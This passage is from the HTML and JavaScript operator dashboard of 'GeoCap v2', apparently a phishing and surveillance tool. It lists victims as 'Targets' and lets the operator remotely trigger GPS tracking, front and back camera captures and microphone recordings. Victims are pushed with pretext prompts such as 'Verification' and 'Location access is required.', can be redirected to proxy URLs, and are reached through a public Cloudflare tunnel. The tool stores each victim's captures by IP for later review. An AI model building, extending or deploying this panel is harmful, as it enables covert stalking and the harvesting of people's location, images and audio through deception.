.app-brand{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--cyan);letter-spacing:-0.5px;margin-right:6px}
.app-brand span{color:var(--text3);font-weight:400}
.mode-pill{
  padding:3px 10px;border-radius:20px;font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;
}
.mode-pill.local{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,211,160,.25)}
.mode-pill.global{background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(0,229,255,.25)}
.sep{width:1px;height:24px;background:var(--border);margin:0 4px}
.url-chip{
  display:flex;align-items:center;gap:8px;background:var(--s3);
  border:1px solid var(--border2);border-radius:8px;padding:3px 10px;
  max-width:280px;overflow:hidden;
}
.url-chip .u{font-family:var(--mono);font-size:11px;color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.url-chip button{background:none;border:none;color:var(--text3);cursor:pointer;font-size:11px;padding:2px}
.url-chip button:hover{color:var(--cyan)}
.proxy-wrap{display:flex;align-items:center;gap:6px}
.proxy-sel{background:var(--s3);border:1px solid var(--border2);color:var(--text);padding:4px 8px;border-radius:7px;font-size:12px;cursor:pointer;max-width:200px;font-family:var(--sans)}
.proxy-sel option{background:var(--s2)}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.live-badge{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11px;color:var(--green)}
.live-dot{width:6px;height:6px;background:var(--green);border-radius:50%;box-shadow:0 0 6px var(--green);animation:blink 2s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.cnt{font-family:var(--mono);font-size:12px;color:var(--text2)}
.cnt em{color:var(--cyan);font-style:normal;font-weight:700}

/* ── Main Layout ── */
#main{display:flex;flex:1;overflow:hidden}

/* ── Sidebar ── */
#sidebar{
  width:238px;flex-shrink:0;background:var(--s1);
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
}
.sb-header{
  padding:11px 14px;border-bottom:1px solid var(--border);
  font-family:var(--mono);font-size:10px;font-weight:600;color:var(--text3);letter-spacing:2px;text-transform:uppercase;
  display:flex;align-items:center;gap:8px;
  justify-content: space-between;
}
.sb-header i{color:var(--cyan);font-size:11px}
.sb-header button {
  background: none;
  border: none;
  color: var(--text3);
  cursor: pointer;
  font-size: 12px;
  padding: 2px 6px;
}
.sb-header button:hover {
  color: var(--cyan);
}
#clients-list{flex:1;overflow-y:auto;padding:6px}
.cl-empty{text-align:center;padding:32px 16px;color:var(--text3)}
.cl-empty i{font-size:28px;margin-bottom:12px;display:block;opacity:.3}
.cl-empty p{font-size:12px;line-height:1.5}
.cli{
  display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:9px;
  cursor:pointer;transition:background .15s;margin-bottom:2px;border:1px solid transparent;
}
.cli:hover{background:var(--s3)}
.cli.active{background:var(--cyan-dim);border-color:rgba(0,229,255,.2)}
.cli-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.cli-dot.on{background:var(--green);box-shadow:0 0 5px var(--green)}
.cli-dot.off{background:var(--text3)}
.cli-info{flex:1;min-width:0}
.cli-id{font-family:var(--mono);font-size:12px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cli-ip{font-size:11px;color:var(--text3);font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cli-os{font-size:13px;color:var(--text3)}

/* ── Content ── */
#content{flex:1;overflow:hidden;display:flex;flex-direction:column;background:var(--bg)}
#no-client{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  color:var(--text3);gap:14px;
  background-image:radial-gradient(ellipse 60% 50% at 50% 50%, rgba(0,229,255,.03) 0%, transparent 70%);
}
#no-client i{font-size:40px;opacity:.2}
#no-client p{font-family:var(--mono);font-size:12px;letter-spacing:2px;text-transform:uppercase}
#cpanel{display:none;flex-direction:column;flex:1;overflow:hidden}

/* ── Client Header ── */
.ch{
  padding:13px 20px;background:var(--s1);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:14px;flex-shrink:0;
}
.ch-id{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--cyan)}
.ch-ip{font-family:var(--mono);font-size:11px;color:var(--text3)}
.ch-badge{padding:2px 9px;border-radius:20px;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
.ch-badge.on{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,211,160,.25)}
.ch-badge.off{background:rgba(74,88,120,.15);color:var(--text3);border:1px solid var(--border)}
.ch-time{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--text3)}

/* ── Tabs ── */
.tab-nav{
  display:flex;background:var(--s1);border-bottom:1px solid var(--border);
  padding:0 12px;overflow-x:auto;flex-shrink:0;
}
.tab-nav::-webkit-scrollbar{display:none}
.tn{
  padding:10px 14px;font-size:12px;font-weight:600;cursor:pointer;
  border:none;background:none;color:var(--text3);white-space:nowrap;
  border-bottom:2px solid transparent;margin-bottom:-1px;transition:all .2s;font-family:var(--sans);
}
.tn:hover{color:var(--text)}
.tn.on{color:var(--cyan);border-bottom-color:var(--cyan)}
.tn i{margin-right:5px;font-size:11px}
.tab-body{flex:1;overflow-y:auto;padding:16px 18px;display:none}
.tab-body.on{display:block}

/* ── Cards ── */
.card{background:var(--s2);border:1px solid var(--border);border-radius:12px;margin-bottom:12px;overflow:hidden}
.card-head{
  padding:10px 14px;background:var(--s3);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:9px;
}
.card-icon{width:26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
.card-title{font-size:12px;font-weight:700;flex:1;font-family:var(--mono);text-transform:uppercase;letter-spacing:.5px;color:var(--text2)}
.cbtn{
  padding:3px 9px;background:var(--s4);border:1px solid var(--border2);
  border-radius:5px;color:var(--text3);font-size:10px;cursor:pointer;transition:all .2s;
  font-family:var(--mono);
}
.cbtn:hover{color:var(--cyan);border-color:var(--cyan)}
.card-body{padding:12px 14px}
.ir{display:flex;justify-content:space-between;align-items:flex-start;padding:5px 0;border-bottom:1px solid var(--s4)}
.ir:last-child{border-bottom:none}
.il{font-size:11px;color:var(--text3);font-family:var(--mono);min-width:130px;flex-shrink:0}
.iv{font-size:11px;color:var(--text);font-family:var(--mono);text-align:right;max-width:280px;word-break:break-all}

/* ── Buttons ── */
.arow{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.abtn{
  display:inline-flex;align-items:center;gap:7px;padding:8px 14px;
  border:1px solid var(--border2);border-radius:8px;background:var(--s3);
  color:var(--text);font-size:12px;cursor:pointer;transition:all .2s;font-family:var(--sans);font-weight:500;
}
.abtn:hover{border-color:var(--cyan-mid);color:var(--cyan)}
.abtn.p{background:var(--cyan-dim);border-color:rgba(0,229,255,.3);color:var(--cyan)}
.abtn.p:hover{background:var(--cyan-mid)}
.abtn.d{background:var(--red-dim);border-color:rgba(244,63,94,.3);color:var(--red)}
.abtn.d:hover{background:rgba(244,63,94,.25)}
.abtn.g{background:var(--green-dim);border-color:rgba(34,211,160,.3);color:var(--green)}
.abtn.y{background:var(--yellow-dim);border-color:rgba(251,191,36,.3);color:var(--yellow)}

/* ── Location ── */
.loc-coords{font-family:var(--mono);font-size:20px;font-weight:700;color:var(--cyan);margin:6px 0}
.loc-acc{font-family:var(--mono);font-size:11px;color:var(--text3)}
.auto-badge{
  display:inline-flex;align-items:center;gap:5px;padding:3px 9px;
  background:var(--green-dim);border:1px solid rgba(34,211,160,.3);
  color:var(--green);border-radius:20px;font-family:var(--mono);font-size:10px;font-weight:700;
}
.auto-badge .bd{width:5px;height:5px;background:var(--green);border-radius:50%;animation:blink 2s ease-in-out infinite}

/* ── Photo Grid (updated) ── */
.pgrid{
  display:grid;
  grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
  gap:12px;
  margin-top:10px;
}
.pitem{
  position:relative;
  border-radius:8px;
  overflow:hidden;
  border:1px solid var(--border);
  cursor:pointer;
  transition:border-color .2s;
  background:var(--s3);
  display:flex;
  flex-direction:column;
}
.pitem:hover{border-color:var(--cyan)}
.pitem img{
  width:100%;
  height:auto;
  display:block;
  object-fit:contain;
  background:#000;
}
.plabel{
  padding:5px 8px;
  background:rgba(6,8,15,.85);
  font-family:var(--mono);
  font-size:10px;
  color:var(--text2);
  backdrop-filter:blur(4px);
  border-top:1px solid var(--border);
}

/* ── Audio ── */
.alist{display:flex;flex-direction:column;gap:8px;margin-top:10px}
.aitem{background:var(--s3);border:1px solid var(--border);border-radius:9px;padding:11px 13px}
.aitem audio{
  width:100%;
  margin-top:7px;
  height:32px;
  border-radius:6px;
  accent-color:var(--cyan);
}
.aitem audio::-webkit-media-controls-panel{background:var(--s4)}
.aitem audio::-webkit-media-controls-play-button,
.aitem audio::-webkit-media-controls-timeline,
.aitem audio::-webkit-media-controls-current-time-display,
.aitem audio::-webkit-media-controls-time-remaining-display,
.aitem audio::-webkit-media-controls-volume-slider{filter:invert(1)}
.alabel{font-family:var(--mono);font-size:10px;color:var(--text3);display:flex;align-items:center;gap:6px;margin-bottom:2px}
.alabel i{color:var(--yellow)}

/* ── Message / Input ── */
.finput,.ftarea{
  width:100%;background:var(--s3);border:1px solid var(--border2);border-radius:8px;
  color:var(--text);padding:9px 12px;font-size:13px;font-family:var(--sans);transition:border-color .2s;
}
.finput:focus,.ftarea:focus{outline:none;border-color:var(--cyan)}
.ftarea{resize:vertical;min-height:80px}
.fgroup{display:flex;flex-direction:column;gap:9px}

/* ── Redirect ── */
.purl-item{
  display:flex;align-items:center;gap:8px;padding:9px 11px;
  background:var(--s3);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;
}
.purl-item .pu{flex:1;font-family:var(--mono);font-size:11px;color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ── System Info ── */
.copy-all{
  width:100%;padding:8px;background:var(--s3);border:1px solid var(--border2);
  border-radius:8px;color:var(--text3);font-size:11px;font-family:var(--mono);cursor:pointer;
  transition:all .2s;margin-bottom:12px;
}
.copy-all:hover{color:var(--cyan);border-color:var(--cyan)}

/* ── Toast ── */
#toast{
  position:fixed;bottom:22px;right:22px;background:var(--s3);
  border:1px solid var(--border2);border-radius:9px;padding:10px 18px;
  font-family:var(--mono);font-size:12px;
  transform:translateY(70px);opacity:0;transition:all .25s;z-index:9999;
  display:flex;align-items:center;gap:8px;
}
#toast.show{transform:translateY(0);opacity:1}
#toast i{color:var(--green)}
</style>
</head>
<body>

<!-- ══ START SCREEN ══ -->
<div id="start">
  <div class="start-logo">
    <h1>GeoCap<span style="color:var(--text3);font-weight:400"> v2</span></h1>
    <p>Client Intelligence Platform</p>
  </div>
  <div class="mode-row">
    <div class="mode-card local" onclick="pickMode('local')">
      <div class="mi"><i class="fa-solid fa-network-wired"></i></div>
      <h3>Local</h3>
      <p>Reachable on your LAN / same network</p>
    </div>
    <div class="mode-card global" onclick="pickMode('global')">
      <div class="mi"><i class="fa-solid fa-globe"></i></div>
      <h3>Global</h3>
      <p>Creates a public Cloudflare tunnel</p>
    </div>
  </div>
  <div id="cf-wait">
    <div class="spin"></div>
    <p>Starting Cloudflare tunnel…</p>
  </div>
</div>

<!-- ══ IMAGE MODAL ═══ -->
<div id="imgModal" onclick="this.style.display='none'">
  <img id="imgModalSrc" src="" alt="">
  <div class="modal-dimensions" id="imgModalDims"></div>
</div>

<!-- ══ OLD CLIENTS EXPLORER PANEL ═══ -->
<div id="oldClientsPanel" class="old-clients-panel">
  <div class="old-header">
    <i class="fa-solid fa-archive" style="color:var(--cyan)"></i>
    <h3>Historical Data</h3>
    <button onclick="toggleOldClientsPanel()"><i class="fa-solid fa-times"></i></button>
  </div>
  <div class="old-search">
    <input type="text" id="oldClientSearch" placeholder="Search clients..." oninput="filterOldClients()">
  </div>
  <div class="old-clients-list" id="oldClientsList">
    <div class="cl-empty">
      <i class="fa-solid fa-folder-open"></i>
      <p>Loading historical data...</p>
    </div>
  </div>
</div>

<!-- ══ TOAST ═══ -->
<div id="toast"><i class="fa-solid fa-check"></i> <span id="toastMsg">Copied</span></div>

<!-- ══ APP ═══ -->
<div id="app">

  <!-- Top Bar -->
  <div id="topbar">
    <span class="app-brand">GEOCAP<span> v2</span></span>
    <span id="modePill" class="mode-pill">—</span>
    <div class="sep"></div>
    <div id="urlChip" class="url-chip" style="display:none">
      <i class="fa-solid fa-link" style="color:var(--text3);font-size:10px"></i>
      <span class="u" id="urlChipText"></span>
      <button onclick="cp(document.getElementById('urlChipText').textContent)" title="Copy URL"><i class="fa-regular fa-copy"></i></button>
    </div>
    <div class="proxy-wrap" id="proxyWrap" style="display:none">
      <i class="fa-solid fa-code-branch" style="color:var(--text3);font-size:11px"></i>
      <select class="proxy-sel" id="proxySel"><option value="">— Proxy URLs —</option></select>
      <button class="cbtn" onclick="cpProxy()"><i class="fa-regular fa-copy"></i></button>
    </div>
    <div class="tb-right">
      <div class="live-badge"><div class="live-dot"></div>LIVE</div>
      <div class="cnt"><em id="onlineCnt">0</em> online</div>
    </div>
  </div>

  <!-- Main -->
  <div id="main">

    <!-- Sidebar -->
    <div id="sidebar">
      <div class="sb-header">
        <span><i class="fa-solid fa-satellite-dish"></i>Targets</span>
        <button onclick="toggleOldClientsPanel()" title="View Historical Data">
          <i class="fa-solid fa-archive"></i>
        </button>
      </div>
      <div id="clients-list">
        <div class="cl-empty">
          <i class="fa-solid fa-signal-bars-slash"></i>
          <p>Awaiting connections…<br>Share the server URL to clients.</p>
        </div>
      </div>
    </div>

    <!-- Content -->
    <div id="content">
      <div id="no-client">
        <i class="fa-solid fa-crosshairs"></i>
        <p>Select a target</p>
      </div>

      <div id="cpanel">

        <!-- Client header -->
        <div class="ch">
          <div>
            <div class="ch-id" id="chId"></div>
            <div class="ch-ip" id="chIp"></div>
          </div>
          <span id="chBadge" class="ch-badge">offline</span>
          <div class="ch-time" id="chTime"></div>
        </div>

        <!-- Tab Nav -->
        <div class="tab-nav">
          <button class="tn on" data-t="location" onclick="tab('location')"><i class="fa-solid fa-location-dot"></i>Location</button>
          <button class="tn" data-t="camera" onclick="tab('camera')"><i class="fa-solid fa-camera"></i>Camera</button>
          <button class="tn" data-t="audio" onclick="tab('audio')"><i class="fa-solid fa-microphone"></i>Microphone</button>
          <button class="tn" data-t="msg" onclick="tab('msg')"><i class="fa-solid fa-comment"></i>Message</button>
          <button class="tn" data-t="redirect" onclick="tab('redirect')"><i class="fa-solid fa-arrow-right-from-bracket"></i>Redirect</button>
          <button class="tn" data-t="sysinfo" onclick="tab('sysinfo')"><i class="fa-solid fa-microchip"></i>System Info</button>
        </div>

        <!-- ── Location ── -->
        <div class="tab-body on" id="tb-location">
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:var(--cyan-dim)"><i class="fa-solid fa-location-dot" style="color:var(--cyan)"></i></div>
              <span class="card-title">GPS Coordinates</span>
              <div id="autoBadge" class="auto-badge" style="display:none"><div class="bd"></div>AUTO-UPDATE</div>
              <div id="locRequestBadge" class="request-badge" style="display:none"></div>
              <button class="cbtn" onclick="cpCard('locData')"><i class="fa-regular fa-copy"></i> Copy</button>
            </div>
            <div class="card-body" id="locData">
              <div id="locEmpty" style="color:var(--text3);text-align:center;padding:18px;font-family:var(--mono);font-size:11px">No location — request it below.</div>
              <div id="locInfo" style="display:none">
                <div class="loc-coords" id="locCoords"></div>
                <div class="loc-acc" id="locAcc"></div>
                <div style="margin-top:10px" id="locRows"></div>
              </div>
            </div>
          </div>
          <div class="arow">
            <button class="abtn p" onclick="sendCmd('trigger_location',{title:'Verification',message:'Location access is required.'})">
              <i class="fa-solid fa-location-arrow"></i>Request Location
            </button>
            <button class="abtn" onclick="openMap()" id="mapBtn" style="display:none">
              <i class="fa-solid fa-map"></i>Open in Maps
            </button>
          </div>
        </div>

        <!-- ── Camera ── -->
        <div class="tab-body" id="tb-camera">
          <div class="arow" id="camBtns">
            <button class="abtn p" onclick="sendCmd('trigger_camera',{facingMode:'user'})">
              <i class="fa-solid fa-camera"></i>Front Camera
            </button>
            <button class="abtn y" id="backCamBtn" onclick="sendCmd('trigger_camera',{facingMode:'environment'})">
              <i class="fa-solid fa-camera-rotate"></i>Back Camera
            </button>
          </div>
          <div id="camRequestBadge" class="request-badge" style="display:none; margin-bottom:10px"></div>
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:rgba(168,85,247,.15)"><i class="fa-solid fa-images" style="color:var(--purple)"></i></div>
              <span class="card-title">Captures</span>
              <button class="cbtn" onclick="cpPhotoPaths()"><i class="fa-regular fa-copy"></i> Paths</button>
            </div>
            <div class="card-body">
              <div id="photoEmpty" style="color:var(--text3);text-align:center;padding:18px;font-family:var(--mono);font-size:11px">No captures yet.</div>
              <div class="pgrid" id="photoGrid"></div>
            </div>
          </div>
        </div>

        <!-- ── Audio ── -->
        <div class="tab-body" id="tb-audio">
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:var(--yellow-dim)"><i class="fa-solid fa-microphone" style="color:var(--yellow)"></i></div>
              <span class="card-title">Microphone</span>
            </div>
            <div class="card-body">
              <div class="arow">
                <div class="rec-btn-wrap" id="recBtnWrap">
                  <div class="rec-ring"></div>
                  <button class="abtn g" id="recBtn" onclick="sendCmd('trigger_audio',{})">
                    <i class="fa-solid fa-circle" style="font-size:10px"></i>Record 10s
                  </button>
                </div>
              </div>
              <div id="audioRequestBadge" class="request-badge" style="display:none; margin-bottom:10px"></div>
              <div id="recStatus" style="display:none">
                <div class="rec-status">
                  <div class="rec-dot"></div>
                  <div class="rec-timer" id="recTimer">10</div>
                  <div class="rec-label">Recording…</div>
                </div>
              </div>
            </div>
          </div>
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:var(--yellow-dim)"><i class="fa-solid fa-waveform-lines" style="color:var(--yellow)"></i></div>
              <span class="card-title">Recordings</span>
            </div>
            <div class="card-body">
              <div id="audioEmpty" style="color:var(--text3);text-align:center;padding:18px;font-family:var(--mono);font-size:11px">No recordings yet.</div>
              <div class="alist" id="audioList"></div>
            </div>
          </div>
        </div>

        <!-- ── Message ── -->
        <div class="tab-body" id="tb-msg">
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:var(--green-dim)"><i class="fa-solid fa-comment" style="color:var(--green)"></i></div>
              <span class="card-title">Deliver Message</span>
            </div>
            <div class="card-body">
              <div class="fgroup">
                <input class="finput" id="msgTitle" placeholder="Title…" value="System Alert">
                <textarea class="ftarea" id="msgBody" placeholder="Message body…"></textarea>
                <button class="abtn p" onclick="doMsg()"><i class="fa-solid fa-paper-plane"></i>Send to Client</button>
              </div>
            </div>
          </div>
        </div>

        <!-- ── Redirect ── -->
        <div class="tab-body" id="tb-redirect">
          <div class="card">
            <div class="card-head">
              <div class="card-icon" style="background:var(--red-dim)"><i class="fa-solid fa-arrow-right-from-bracket" style="color:var(--red)"></i></div>
              <span class="card-title">Redirect Client</span>
            </div>
            <div class="card-body">
              <div style="display:flex;gap:8px;margin-bottom:14px">
                <input class="finput" id="redirUrl" placeholder="https://…" style="flex:1">
                <button class="abtn d" onclick="doRedir()"><i class="fa-solid fa-arrow-right"></i>Go</button>
              </div>
              <div style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:10px;text-transform:uppercase;letter-spacing:1px">Saved Proxy URLs</div>
              <div id="purlList"></div>
              <div style="display:flex;gap:8px;margin-top:12px">
                <input class="finput" id="newPurl" placeholder="Add proxy URL…" style="flex:1">
                <button class="abtn" onclick="addProxy()"><i class="fa-solid fa-plus"></i>Add</button>
              </div>
            </div>
          </div>
        </div>

        <!-- ── System Info ── -->
        <div class="tab-body" id="tb-sysinfo">
          <button class="copy-all" onclick="cpAll()"><i class="fa-regular fa-copy"></i> Copy All System Data (JSON)</button>
          <div id="siCards"></div>
        </div>

      </div><!-- /cpanel -->
    </div><!-- /content -->
  </div><!-- /main -->
</div><!-- /app -->

<script>
/* ═══════════════════════════════════════════════════════════
   STATE
═══════════════════════════════════════════════════════════ */
const adminSecret = 'ADMIN_SECRET_PLACEHOLDER';
const adm = io('/' + adminSecret);
let C = {};          // clients map
let SEL = null;      // selected client id
let PURLS = [];      // proxy urls
let pendingRequests = {}; // Track request statuses
let oldClients = []; // Historical clients data

/* ═══ Boot ═══ */
adm.on('connect', () => {
  fetch('/api/state').then(r=>r.json()).then(applyState);
  fetch('/api/clients').then(r=>r.json()).then(applyClients);
  loadOldClients();
});
adm.on('state_update', applyState);
adm.on('clients_update', applyClients);
adm.on('client_update', d => {
  C[d.id] = {...(C[d.id]||{}), ...d};
  rebuildSidebar();
  if(SEL===d.id) refreshPanel(d.id);
});

adm.on('request_status', d => {
  pendingRequests[d.requestId] = d;
  if(SEL === d.clientId) {
    showRequestStatus(d);
  }
});

function showRequestStatus(req) {
  const badges = {
    'location': 'locRequestBadge',
    'camera': 'camRequestBadge',
    'audio': 'audioRequestBadge'
  };
  
  const badgeId = badges[req.type];
  if(badgeId) {
    const badge = document.getElementById(badgeId);
    if(badge) {
      badge.style.display = 'inline-flex';
      badge.className = `request-badge ${req.status}`;
      badge.innerHTML = `<i class="fa-solid fa-circle"></i> ${req.type}: ${req.status}`;
      
      if(req.status !== 'pending') {
        setTimeout(() => {
          badge.style.display = 'none';
        }, 5000);
      }
    }
  }
}

/* ═══ Old Clients Explorer ═══ */
async function loadOldClients() {
  try {
    const res = await fetch('/api/old_clients');
    oldClients = await res.json();
    renderOldClients();
  } catch(e) {
    console.error('Failed to load old clients:', e);
  }
}

function renderOldClients() {
  const list = document.getElementById('oldClientsList');
  if(!oldClients.length) {
    list.innerHTML = '<div class="cl-empty"><i class="fa-solid fa-folder-open"></i><p>No historical data found</p></div>';
    return;
  }
  
  list.innerHTML = oldClients.map(c => `
    <div class="old-client-item" onclick="loadHistoricalClient('${c.id}')">
      <div class="old-client-id">${c.id}</div>
      <div class="old-client-meta">
        <span><i class="fa-solid fa-calendar"></i> ${c.first_seen}</span>
        <span><i class="fa-solid fa-location-dot"></i> ${c.last_ip || 'Unknown'}</span>
      </div>
      <div class="old-client-stats">
        <span><i class="fa-solid fa-camera"></i> ${c.photo_count || 0}</span>
        <span><i class="fa-solid fa-microphone"></i> ${c.audio_count || 0}</span>
        <span><i class="fa-solid fa-location-dot"></i> ${c.location_count || 0}</span>
      </div>
    </div>
  `).join('');
}

function filterOldClients() {
  const search = document.getElementById('oldClientSearch').value.toLowerCase();
  const filtered = oldClients.filter(c => 
    c.id.toLowerCase().includes(search) || 
    (c.last_ip && c.last_ip.includes(search))
  );
  
  const list = document.getElementById('oldClientsList');
  list.innerHTML = filtered.map(c => `
    <div class="old-client-item" onclick="loadHistoricalClient('${c.id}')">
      <div class="old-client-id">${c.id}</div>
      <div class="old-client-meta">
        <span><i class="fa-solid fa-calendar"></i> ${c.first_seen}</span>
        <span><i class="fa-solid fa-location-dot"></i> ${c.last_ip || 'Unknown'}</span>
      </div>
      <div class="old-client-stats">
        <span><i class="fa-solid fa-camera"></i> ${c.photo_count || 0}</span>
        <span><i class="fa-solid fa-microphone"></i> ${c.audio_count || 0}</span>
        <span><i class="fa-solid fa-location-dot"></i> ${c.location_count || 0}</span>
      </div>
    </div>
  `).join('');
}

async function loadHistoricalClient(clientId) {
  try {
    const res = await fetch(`/api/old_client/${clientId}`);
    const data = await res.json();
    
    // Add to clients map with offline status
    C[clientId] = {
      ...data,
      online: false,
      id: clientId
    };
    
    rebuildSidebar();
    pick(clientId);
    toggleOldClientsPanel();
    toast('Loaded historical data for ' + clientId);
  } catch(e) {
    toast('Error loading historical data');
  }
}

function toggleOldClientsPanel() {
  const panel = document.getElementById('oldClientsPanel');
  panel.classList.toggle('open');
  if(panel.classList.contains('open')) {
    loadOldClients();
  }
}

/* ═══ Mode Selection ═══ */
function pickMode(m) {
  if(m==='global'){
    document.getElementById('cf-wait').style.display='block';
    document.querySelectorAll('.mode-card').forEach(c=>c.style.opacity='.4');
  }
  fetch('/api/mode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mode:m})})
    .then(r=>r.json()).then(d=>{
      if(d.status==='ok'){
        document.getElementById('start').style.display='none';
        document.getElementById('app').style.display='flex';
        applyState({mode:m, cf_url:d.url, proxy_urls:PURLS});
      } else {
        document.getElementById('cf-wait').innerHTML=
          `<p style="color:var(--red);font-family:var(--mono);font-size:12px;max-width:320px;text-align:center">${d.error}</p>
           <button class="abtn" style="margin-top:14px" onclick="location.reload()">Try Again</button>`;
      }
    }).catch(e=>{
      document.getElementById('cf-wait').innerHTML=
        `<p style="color:var(--red);font-family:var(--mono);font-size:12px">Network error: ${e.message}</p>`;
    });
}

function applyState(d) {
  if(d.mode){
    const pill=document.getElementById('modePill');
    pill.className='mode-pill '+(d.mode==='local'?'local':'global');
    pill.textContent=d.mode==='local'?'⬡ LOCAL':'⬡ GLOBAL';
  }
  if(d.cf_url){
    document.getElementById('urlChipText').textContent=d.cf_url;
    document.getElementById('urlChip').style.display='flex';
  }
  if(d.proxy_urls){ PURLS=d.proxy_urls; syncProxyUI(); }
}

function applyClients(d) {
  C=d;
  rebuildSidebar();
  document.getElementById('onlineCnt').textContent=Object.values(C).filter(c=>c.online).length;
}

/* ═══ Sidebar ═══ */
function rebuildSidebar() {
  document.getElementById('onlineCnt').textContent=Object.values(C).filter(c=>c.online).length;
  const ids=Object.keys(C);
  const list=document.getElementById('clients-list');
  if(!ids.length){
    list.innerHTML='<div class="cl-empty"><i class="fa-solid fa-signal-bars-slash"></i><p>Awaiting connections…</p></div>';
    return;
  }
  list.innerHTML=ids.map(id=>{
    const c=C[id]; const dd=c.device_info?.deviceDetails||{};
    return `<div class="cli ${SEL===id?'active':''}" onclick="pick('${id}')">
      <div class="cli-dot ${c.online?'on':'off'}"></div>
      <div class="cli-info">
        <div class="cli-id">${id.replace('gc_','').slice(0,12)}</div>
        <div class="cli-ip">${c.current_ip||'—'}</div>
      </div>
      <div class="cli-os">${osIcon(dd.os)}</div>
    </div>`;
  }).join('');
}

function osIcon(os){
  const m={Windows:'<i class="fa-brands fa-windows"></i>',MacOS:'<i class="fa-brands fa-apple"></i>',
    Linux:'<i class="fa-brands fa-linux"></i>',Android:'<i class="fa-brands fa-android"></i>',
    iOS:'<i class="fa-brands fa-apple"></i>'};
  return m[os]||'<i class="fa-solid fa-desktop"></i>';
}

function pick(id) {
  SEL=id;
  rebuildSidebar();
  document.getElementById('no-client').style.display='none';
  const p=document.getElementById('cpanel');
  p.style.display='flex'; p.style.flexDirection='column'; p.style.flex='1'; p.style.overflow='hidden';
  refreshPanel(id);
}

/* ═══ Panel Refresh ═══ */
function refreshPanel(id) {
  if(id!==SEL) return;
  const c=C[id]; if(!c) return;

  document.getElementById('chId').textContent=id;
  document.getElementById('chIp').textContent='IP: '+(c.current_ip||'Unknown');
  const b=document.getElementById('chBadge');
  b.className='ch-badge '+(c.online?'on':'off');
  b.textContent=c.online?'ONLINE':'OFFLINE';
  document.getElementById('chTime').textContent=c.last_seen?'Last: '+ago(c.last_seen):'';

  renderLocation(c); renderCamera(c); renderAudio(c);
  renderSysInfo(c); renderPurlList();

  const dd=c.device_info?.deviceDetails||{};
  document.getElementById('backCamBtn').style.display=(dd.isMobile||dd.isTablet)?'inline-flex':'none';
}

/* ═══ Location Tab ═══ */
function renderLocation(c) {
  const loc=c.last_location;
  document.getElementById('locEmpty').style.display=loc?'none':'block';
  document.getElementById('locInfo').style.display=loc?'block':'none';
  document.getElementById('autoBadge').style.display=c.auto_location?'inline-flex':'none';
  document.getElementById('mapBtn').style.display=loc?'inline-flex':'none';
  if(!loc) return;
  document.getElementById('locCoords').textContent=`${loc.lat?.toFixed(7)},  ${loc.lon?.toFixed(7)}`;
  document.getElementById('locAcc').textContent=`Accuracy: ±${loc.accuracy?.toFixed(0)}m`;
  const rows=[
    ['Latitude', loc.lat?.toFixed(10)],
    ['Longitude', loc.lon?.toFixed(10)],
    ['Accuracy', loc.accuracy ? `${loc.accuracy.toFixed(2)} m` : 'N/A'],
    ['Altitude', loc.altitude!=null ? `${loc.altitude?.toFixed(2)} m` : 'N/A'],
    ['Heading', loc.heading!=null ? `${loc.heading}°` : 'N/A'],
    ['Speed', loc.speed!=null ? `${loc.speed} m/s` : 'N/A'],
    ['Timestamp', loc.timestamp],
  ];
  document.getElementById('locRows').innerHTML=rows.map(([k,v])=>`<div class="ir"><span class="il">${k}</span><span class="iv">${v}</span></div>`).join('');
}

/* ═══ Camera Tab ═══ */
function renderCamera(c) {
  const photos=c.photos||[];
  document.getElementById('photoEmpty').style.display=photos.length?'none':'block';
  document.getElementById('photoGrid').innerHTML=photos.map(p=>`
    <div class="pitem" onclick="showImg('/files/${c.id||SEL}/${p.ip}/${p.filename}', ${p.width || 0}, ${p.height || 0})">
      <img src="/files/${c.id||SEL}/${p.ip}/${p.filename}" loading="lazy" alt="capture">
      <div class="plabel"><i class="fa-solid fa-${p.facingMode==='user'?'user':'camera'}"></i> ${ago(p.timestamp)}</div>
    </div>`).join('');
}

/* ═══ Audio Tab ═══ */
function renderAudio(c) {
  const audios = c.audios || [];
  document.getElementById('audioEmpty').style.display = audios.length ? 'none' : 'block';
  
  document.getElementById('audioList').innerHTML = audios.map((a, i) => {
    // Determine MIME type based on file extension
    let mimeType = 'audio/webm'; // default
    if (a.filename.endsWith('.mp3')) mimeType = 'audio/mpeg';
    else if (a.filename.endsWith('.m4a')) mimeType = 'audio/mp4';
    else if (a.filename.endsWith('.ogg')) mimeType = 'audio/ogg';
    else if (a.mime_type) mimeType = a.mime_type; // Use stored MIME type if available
    
    return `
      <div class="aitem">
        <div class="alabel">
          <i class="fa-solid fa-microphone"></i>  
